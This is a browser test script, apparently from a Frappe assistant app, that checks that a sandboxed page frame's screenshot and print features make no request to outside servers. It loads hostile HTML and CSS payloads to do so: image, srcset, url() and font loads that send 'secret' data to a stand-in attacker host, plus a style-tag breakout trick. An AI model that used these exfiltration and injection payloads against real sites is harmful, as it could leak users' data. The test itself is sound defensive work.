/**
 * Real-browser check that a personal page's picture and print reach no other server.
 *
 * jsdom cannot draw a page or load an image, so this runs the shipped code in Chrome. It serves
 * the built frame runtime as /assets would, loads a hostile page (off-site img, srcset, url(),
 * @font-face, the \3c/style\3e trick, nested CSS, a preconnect link), takes FACO's picture, prints
 * the page's raw markup, and fails if any request leaves the local origin.
 *
 *   npm run build                                  # builds public/js/fac_page_frame*.js
 *   npx vite build -c scripts/page-frame-leak-check/vite.config.mjs
 *   npm i --no-save playwright-core@1.56.1
 *   CHROME=/path/to/chrome node scripts/page-frame-leak-check/run.mjs
 */
import { createServer } from "node:http";
import { readFileSync, writeFileSync } from "node:fs";
import { resolve } from "node:path";
import { chromium } from "playwright-core";

const HERE = import.meta.dirname;
const PUBLIC_JS = resolve(HERE, "../../../../public/js");
const PORT = 8097;
const ORIGIN = `http://127.0.0.1:${PORT}`;
const EVIL = "http://127.0.0.1:8098";

const FILES = {
	"/": ["text/html", '<!doctype html><meta charset="utf-8"><body><script src="/harness.js"></script>'],
	"/harness.js": ["text/javascript", () => readFileSync(resolve(HERE, "dist/harness.js"))],
	"/assets/frappe_assistant_core/js/fac_page_frame.js": ["text/javascript", () => readFileSync(resolve(PUBLIC_JS, "fac_page_frame.js"))],
	"/assets/frappe_assistant_core/js/fac_page_charts.js": ["text/javascript", () => readFileSync(resolve(PUBLIC_JS, "fac_page_charts.js"))],
};

const HOSTILE_HTML = [
	`<p>Salary total 70,29,354</p><table><tr><td>India</td><td>74%</td></tr></table>`,
	`<img src="${EVIL}/img?d=secret"><img srcset="${EVIL}/srcset 2x">`,
	`<div style="width:50px;height:50px;background:url(${EVIL}/bg)"></div>`,
	`<div class="chart" style="height:120px"></div>`,
].join("");
const HOSTILE_SCRIPT = `
const style = document.createElement("style");
style.textContent = '@font-face{font-family:leak;src:url(${EVIL}/font)} .x{font-family:leak} ' +
	'.a{content:"\\\\3c/style\\\\3e<img src=${EVIL}/breakout>"} .n{color:red; & .m{background:url(${EVIL}/nested)}}';
document.head.append(style);
root_element.insertAdjacentHTML("beforeend", '<p class="x a n"><span class="m">x</span></p><link rel="preconnect" href="${EVIL}/pre">');
fac.chart(root_element.querySelector(".chart"), {xAxis: {type: "category", data: ["A", "B"]}, yAxis: {}, series: [{type: "bar", data: [3, 5]}]});
`;

const server = createServer((req, res) => {
	const file = FILES[req.url.split("?")[0]];
	if (!file) return res.writeHead(404).end();
	res.writeHead(200, { "Content-Type": file[0] }).end(typeof file[1] === "function" ? file[1]() : file[1]);
}).listen(PORT, "127.0.0.1");

const browser = await chromium.launch({ executablePath: process.env.CHROME });
const page = await browser.newPage();
// Requests that reached the network: one a policy blocked never gets a response.
const offsite = [];
page.on("response", (r) => {
	const url = r.url();
	if (!/^(http:\/\/127\.0\.0\.1:8097|data:|blob:|about:)/.test(url)) offsite.push(url);
});
await page.goto(`${ORIGIN}/`);
const shot = await page.evaluate((p) => window.captureHostilePage(p), { title: "x", html: HOSTILE_HTML, style: "", script: HOSTILE_SCRIPT });
await page.evaluate((html) => window.printRawMarkup(html), HOSTILE_HTML + '<link rel="stylesheet" href="' + EVIL + '/sheet.css"><style>@import url(' + EVIL + "/import.css)</style>");
const breakout = await page.evaluate(
	(e) => window.cleanSnapshot(`<style>.a{content:"\\3c/style\\3e<img src=${e}/b>"} .n{color:red; & .m{background:url(${e}/n)}}</style>`),
	EVIL,
);
await page.waitForTimeout(2500);
await browser.close();
server.close();

// The picture, to look at: it should show the figures and the chart.
if (shot.image) writeFileSync(resolve(HERE, "dist/capture.jpg"), Buffer.from(shot.image, "base64"));
const result = { capture: { ...shot, image: undefined }, cleanedBreakout: breakout, offsiteRequests: offsite };
console.log(JSON.stringify(result, null, 2));
// The breakout may stay as escaped text inside a CSS string; it must never become an element.
const leaked = !shot.ok || offsite.length > 0 || /<img/i.test(breakout.replace(/<style>[\s\S]*?<\/style>/g, "")) || !shot.text?.includes("70,29,354");
process.exit(leaked ? 1 : 0);
